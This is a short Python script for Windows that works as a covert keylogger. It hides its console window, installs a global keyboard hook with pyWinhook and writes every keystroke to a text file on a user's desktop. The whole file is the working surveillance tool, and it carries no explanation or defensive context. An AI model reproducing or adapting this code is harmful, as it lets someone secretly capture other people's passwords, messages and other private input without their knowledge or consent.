import pyWinhook, pythoncom, sys, logging
import win32api 
import win32console 
import win32gui 

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0)
file_log = "C:/Users/Sneden/Desktop/onlygodknows/output.txt"
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()